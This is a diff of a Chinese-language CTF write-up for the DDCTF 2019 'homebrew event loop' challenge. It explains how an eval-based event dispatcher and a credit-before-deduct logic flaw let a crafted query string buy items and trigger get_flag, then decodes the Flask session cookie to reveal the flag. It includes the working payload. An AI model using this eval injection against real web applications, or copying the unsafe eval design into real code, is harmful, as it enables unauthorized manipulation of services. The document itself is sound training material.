 <p><strong>从现在来看，之前的一切都是在为我们买东西做准备，接收了我们的参数以后，如果我们没有买东西，就是我们初步登录的这个界面，将我们一切东西初始化。重点是下面三个</strong></p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/4.png" alt="4"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/4.png" alt="4"></p>
 <hr>
 <p><strong><code>request.prev_session = dict(session)</code></strong>  这把刚刚初始化的session用字典的形式传给了这个参数到了90行，我们看到了一个函数 <strong><code>trigger_event</code></strong> ,我们在vscode上面跟进这个函数</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/5.png" alt="5"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/5.png" alt="5"></p>
 <p>可以看到，实际上**<code>trigger_event</code><strong>的形参</strong><code>event</code>**  就是我们刚刚获得url?后面的字符串 <strong><code>querystring</code></strong>  。并且将它加入到</p>
 <p><strong><code>session['log']</code></strong>  这个日志</p>
 <p>问题来了，下面两个if语句，是什么意思呢？</p>
 <ul>
 <li>
 <p><strong>第一个</strong></p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/7.png" alt="7"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/7.png" alt="7"></p>
 </li>
 </ul>
-<p>举个例子<img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/6.png" alt="6">  ，也就是要后面5个，前面都不要了</p>
+<p>举个例子<img src="DDCTF-2019-homebrew-event-loop.assets/6.png" alt="6">  ，也就是要后面5个，前面都不要了</p>
 <ul>
 <li><strong>第二个</strong></li>
 </ul>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/8.png" alt="8"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/8.png" alt="8"></p>
 <p>如果我们刚刚传入的参数也就是url?后面的字符串是列表类型，就合并。这两个列表 <strong><code>request.event_queue</code></strong>  和 **<code>event</code>**合并在一起。可能有人会问 <strong><code>request.event_queue</code></strong>  是什么，就在前面才定义 😢</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/9.png" alt="9"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/9.png" alt="9"></p>
 <p>这个时候，你也许会问，它之前在路由定义的，现在函数里面能用吗？可以，因为它是全局变量，即使函数没有声明，也可以使用。 * 顺便说一下，列表也是可以合并的，a=[1,5] b=[3,4,5]   a+b=[1,3,4,5,5] *</p>
 <p>如果没有进行第二个if条件判断，就执行  <strong><code>request.event_queue.append(event)</code></strong>  加入到这个列表当中。</p>
 <hr>
 <p>这个时候我们来看91行的return返回函数  <strong><code>return execute_event_loop()</code></strong>  ,我们在vscode上面跟进函数</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/10.png" alt="10"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/10.png" alt="10"></p>
 <p>首先初始化设置了两个参数</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br></pre></td></tr></table></figure>
 <p>进入while循环吗，我们再来想一下request.enent_queque是什么东西？</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/11.png" alt="11"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/11.png" alt="11"></p>
 <p>也就是我们url?后面的字符串，加入到这个列表中。以后不会再重复了</p>
 <hr>
 <p>while循环一进来就是这个</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/12.png" alt="12"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/12.png" alt="12"></p>
 <p>就是将我们刚刚输入的字符串的列表第一个赋值给 <strong><code>event</code></strong>  ,然后删除了第一个值，因为第一个值已经给了 <strong><code>event</code></strong>  ,然后删除了第一个值，因为第一个值已经给了 <strong><code>event</code></strong>  ，没必要留着</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/13.png" alt="13"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/13.png" alt="13"></p>
 <p><strong><code>  if not event.startswith(('action:', 'func:')):</code></strong></p>
 <p>如果我们第一个字符串开头不是  <strong><code>action </code></strong> 或 <strong><code>func</code></strong> ,就进入if判断语句继续。下一个for循环一次检验 <strong><code>event</code></strong>  中有没有字符，，可能有人忘了  <strong><code>valid_event_chars:</code></strong>  是什么…</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/14.png" alt="14"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/14.png" alt="14"></p>
 <hr>
 <p>重点来了</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
@@ -557,9 +519,9 @@
 <p>​    **<code> action = get_mid_str(event, ':', ';')</code> **</p>
 <p>​      <strong><code>args = get_mid_str(event, action+';').split('#')</code></strong></p>
 <p>在vscode里面跟进这个函数</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/15.png" alt="15"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/15.png" alt="15"></p>
 <p>这个函数的大概作用是</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/16.png" alt="16"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/16.png" alt="16"></p>
 <p><strong><code>action</code></strong>  是由实际作用，因为 **<code>eval</code> **  函数会用到，args函数不知道有啥用，大佬的wp是：返回列表到args里，所以很明显，我们上传的参数就是action开头，才能上传过来</p>
 <p>大佬的wp更直观</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ACTION_handler</span>():</span><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">event = <span class="string">&#x27;action:ACTION;ARGS0#ARGS1#ARGS2&#x27;</span></span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] action:&#x27;</span>,action</span><br><span class="line">args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] args:&#x27;</span>,args</span><br><span class="line">event_handler = <span class="built_in">eval</span>(action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] event_handler:&#x27;</span>,event_handler</span><br></pre></td></tr></table></figure>
@@ -571,13 +533,13 @@
 <p>其他没啥分析，我们找到可以控制的点</p>
 <p>我们去找找如何得到falg（因为我们有eval执行函数）</p>
 <p>我们看到FLAG函数是不带参数</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/17.png" alt="17"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/17.png" alt="17"></p>
 <p>现在，我们可以控制  <strong><code>event_handler</code></strong>  运行指定的函数，不过还有一个问题是FLAG()函数是不带参数，而 <strong><code>args</code></strong>  为**<code>list</code>** ，直接传入 <strong><code>action:FLAG</code></strong>  ，将产生报错</p>
 <p>为什么其他参数不行？</p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/18.png" alt="18"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/18.png" alt="18"></p>
 <p>这里是参数args的</p>
 <p>那么没办法，只好分析源码,我们发现 <strong><code>show_flag_function</code></strong>  是没办法得到falg，因为return flag 被注释掉了，只是将它放到flag中。想要得到flag只能用**<code>get_flag_handler()</code>**可以得到flag，而得到flag的条件是是 <strong><code>if session['num_items'] &gt;= 5:</code></strong>  ，于是我们进入题目界面，去买钻石💎，发现最多买3个，不能买5个以及5个以上。<strong>我们看一下买钻石的函数</strong></p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/19.png" alt="19"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/19.png" alt="19"></p>
 <p>发现存在逻辑漏洞：就是我们的钱无论够不够，它都会给我们先加上，然后扣掉</p>
 <p>我们发现第148行，无论我们的钱够不够，都先给我们加上，之后再扣掉</p>
 <p>若让 <strong><code>eval()</code></strong>  去执行  <strong><code>trigger_event()</code></strong> ，并且在后面跟两个命令作为参数，分别是 <strong><code>buy</code></strong> 和 <strong><code>get_flag</code></strong> ，那么**<code>buy</code>**和  **<code>get_flag </code>**便先后进入队列。</p>
@@ -585,11 +547,11 @@
 <hr>
 <p>我们构造plyadload</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">action:trigger_event%<span class="number">23</span>;action:buy;<span class="number">5</span>%23action:get_flag;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/23.png" alt="23"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/23.png" alt="23"></p>
 <p>我们把得到的session放到KALI里面的flask-session-cookie-manager-master进行解密</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#39;session&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/24.png" alt="24"></p>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/25.png" alt="25"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/24.png" alt="24"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/25.png" alt="25"></p>
 <p><strong>func:show_flag;flag{d07646de-b436-4966-ad68-fd2fc9d9764f}</strong>                         ❣️ ❣️  ❣️  ❣️ ​</p>
 ]]></content>
       <categories>
